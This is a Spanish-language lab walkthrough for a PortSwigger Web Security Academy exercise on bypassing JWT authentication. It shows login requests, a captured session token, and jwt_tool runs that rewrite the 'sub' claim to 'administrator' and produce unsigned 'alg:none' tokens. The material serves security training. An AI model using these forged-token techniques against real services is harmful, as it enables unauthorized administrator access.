---
description: >-
  https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification
---

# Lab 2: JWT authentication bypass via flawed signature verification

Primero realizamos una autenticacion:

```
POST /login HTTP/2
Host: 0a7c007c04f70cd58309159f00be00c8.web-security-academy.net
Cookie: session=
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
Origin: https://0a7c007c04f70cd58309159f00be00c8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7c007c04f70cd58309159f00be00c8.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=YwE9NuwGyu05JsjmizpEJXSKFVGZj9R8&username=wiener&password=peter
```

La respuesta de lo anterior es:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=eyJraWQiOiI5MzcwNTRjMy1iNGUwLTRkMmUtOTI0NC03ZTFkZWYxNWNhZjMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTU3OCwic3ViIjoid2llbmVyIn0.P-pXxYCYGxvAGBE7tRMzUPfPUG4GtQr89RncgvJcsr9fQy4y3MdN7cJHT1fgenji2FO3ER_E4zf9QilWWZMJ7DFi5YQHTfwDJpzh1MYr0RXjsZMDhzFJphl8ut3yF4hJPkyCDAiTCbehHu4DSKiAESgoOC1vRnBsgduMKwfWiWpU6f7oyfdtyqz4UkCB_lI2K0tNwubE5QqvGhkaemIF86ib_NKAhvjli1BC9GVY8E4T3V9FMkIW_AEKJ7EQ-WFTaO_WpdnbRkAqridqcUR1ak_4XjZDJHdoWdcS07aiKeWa14UDaCIQbi2zhv1t1MwmmXhsrTG-T3JPNpZBpK-MYA; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

Ahora que ya tenemos nuestro JWT nos enfocaremos en:

```
GET /admin HTTP/2
Host: 0a7c007c04f70cd58309159f00be00c8.web-security-academy.net
Cookie: session=eyJraWQiOiI5MzcwNTRjMy1iNGUwLTRkMmUtOTI0NC03ZTFkZWYxNWNhZjMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTU3OCwic3ViIjoid2llbmVyIn0.P-pXxYCYGxvAGBE7tRMzUPfPUG4GtQr89RncgvJcsr9fQy4y3MdN7cJHT1fgenji2FO3ER_E4zf9QilWWZMJ7DFi5YQHTfwDJpzh1MYr0RXjsZMDhzFJphl8ut3yF4hJPkyCDAiTCbehHu4DSKiAESgoOC1vRnBsgduMKwfWiWpU6f7oyfdtyqz4UkCB_lI2K0tNwubE5QqvGhkaemIF86ib_NKAhvjli1BC9GVY8E4T3V9FMkIW_AEKJ7EQ-WFTaO_WpdnbRkAqridqcUR1ak_4XjZDJHdoWdcS07aiKeWa14UDaCIQbi2zhv1t1MwmmXhsrTG-T3JPNpZBpK-MYA
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Referer: https://0a7c007c04f70cd58309159f00be00c8.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

La peticion anterior tiene el siguiente JWT:

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

y retorna lo siguiente:

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Luego de lo anterior, realizamos el ataque:

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

## Utilizando jwt\_tool

Para utilizar esta tool primero modificamos el sub y luego le pasamos el token modificado a la herramienta con el parametro -X a

```bash
┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP/jwt_tool]
└─# python3 jwt_tool.py eyJraWQiOiI5MzcwNTRjMy1iNGUwLTRkMmUtOTI0NC03ZTFkZWYxNWNhZjMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTU3OCwic3ViIjoid2llbmVyIn0.P-pXxYCYGxvAGBE7tRMzUPfPUG4GtQr89RncgvJcsr9fQy4y3MdN7cJHT1fgenji2FO3ER_E4zf9QilWWZMJ7DFi5YQHTfwDJpzh1MYr0RXjsZMDhzFJphl8ut3yF4hJPkyCDAiTCbehHu4DSKiAESgoOC1vRnBsgduMKwfWiWpU6f7oyfdtyqz4UkCB_lI2K0tNwubE5QqvGhkaemIF86ib_NKAhvjli1BC9GVY8E4T3V9FMkIW_AEKJ7EQ-WFTaO_WpdnbRkAqridqcUR1ak_4XjZDJHdoWdcS07aiKeWa14UDaCIQbi2zhv1t1MwmmXhsrTG-T3JPNpZBpK-MYA -T

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] kid = "937054c3-b4e0-4d2e-9244-7e1def15caf3"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] iss = "portswigger"
[2] exp = 1717449578    ==> TIMESTAMP = 2024-06-03 16:19:38 (UTC)
[3] sub = "wiener"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 3

Current value of sub is: wiener
Please enter new value and hit ENTER
> administrator
[1] iss = "portswigger"
[2] exp = 1717449578    ==> TIMESTAMP = 2024-06-03 16:19:38 (UTC)
[3] sub = "administrator"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_68c875c073f1c450ea65169ec35c773d - Tampered token:
[+] eyJraWQiOiI5MzcwNTRjMy1iNGUwLTRkMmUtOTI0NC03ZTFkZWYxNWNhZjMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTU3OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.P-pXxYCYGxvAGBE7tRMzUPfPUG4GtQr89RncgvJcsr9fQy4y3MdN7cJHT1fgenji2FO3ER_E4zf9QilWWZMJ7DFi5YQHTfwDJpzh1MYr0RXjsZMDhzFJphl8ut3yF4hJPkyCDAiTCbehHu4DSKiAESgoOC1vRnBsgduMKwfWiWpU6f7oyfdtyqz4UkCB_lI2K0tNwubE5QqvGhkaemIF86ib_NKAhvjli1BC9GVY8E4T3V9FMkIW_AEKJ7EQ-WFTaO_WpdnbRkAqridqcUR1ak_4XjZDJHdoWdcS07aiKeWa14UDaCIQbi2zhv1t1MwmmXhsrTG-T3JPNpZBpK-MYA

┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP/jwt_tool]
└─# python3 jwt_tool.py eyJraWQiOiI5MzcwNTRjMy1iNGUwLTRkMmUtOTI0NC03ZTFkZWYxNWNhZjMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTU3OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.P-pXxYCYGxvAGBE7tRMzUPfPUG4GtQr89RncgvJcsr9fQy4y3MdN7cJHT1fgenji2FO3ER_E4zf9QilWWZMJ7DFi5YQHTfwDJpzh1MYr0RXjsZMDhzFJphl8ut3yF4hJPkyCDAiTCbehHu4DSKiAESgoOC1vRnBsgduMKwfWiWpU6f7oyfdtyqz4UkCB_lI2K0tNwubE5QqvGhkaemIF86ib_NKAhvjli1BC9GVY8E4T3V9FMkIW_AEKJ7EQ-WFTaO_WpdnbRkAqridqcUR1ak_4XjZDJHdoWdcS07aiKeWa14UDaCIQbi2zhv1t1MwmmXhsrTG-T3JPNpZBpK-MYA -X a

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

jwttool_f5a648c6863b971bde57185bf2795c66 - EXPLOIT: "alg":"none" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJraWQiOiI5MzcwNTRjMy1iNGUwLTRkMmUtOTI0NC03ZTFkZWYxNWNhZjMiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTU3OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
jwttool_e319ff1061aa40011f740140c2722bf6 - EXPLOIT: "alg":"None" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJraWQiOiI5MzcwNTRjMy1iNGUwLTRkMmUtOTI0NC03ZTFkZWYxNWNhZjMiLCJhbGciOiJOb25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTU3OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
jwttool_0f2fe5fd1f729d1965704665ab4a0c27 - EXPLOIT: "alg":"NONE" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJraWQiOiI5MzcwNTRjMy1iNGUwLTRkMmUtOTI0NC03ZTFkZWYxNWNhZjMiLCJhbGciOiJOT05FIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTU3OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
jwttool_b4155a040050567218a767a14762d124 - EXPLOIT: "alg":"nOnE" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJraWQiOiI5MzcwNTRjMy1iNGUwLTRkMmUtOTI0NC03ZTFkZWYxNWNhZjMiLCJhbGciOiJuT25FIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTU3OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```
